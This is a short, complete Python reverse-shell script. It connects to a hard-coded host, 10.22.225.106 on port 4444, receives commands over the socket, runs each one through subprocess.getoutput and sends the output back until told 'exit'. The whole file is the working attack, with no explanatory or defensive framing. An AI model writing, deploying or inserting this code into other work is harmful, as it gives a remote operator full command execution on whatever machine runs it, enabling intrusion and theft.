import socket as sk, subprocess

sk = sk.socket(sk.AF_INET, sk.SOCK_STREAM)

RHOST = "10.22.225.106"
RPORT = 4444

print(f"Connecting to {RHOST}:{RPORT}...")
sk.connect((RHOST, RPORT))

print("Connection Established...")

while True:
    input = sk.recv(1024).decode()
    if input == "exit":
        break
    output = subprocess.getoutput(input)
    sk.send(output.encode())

sk.close()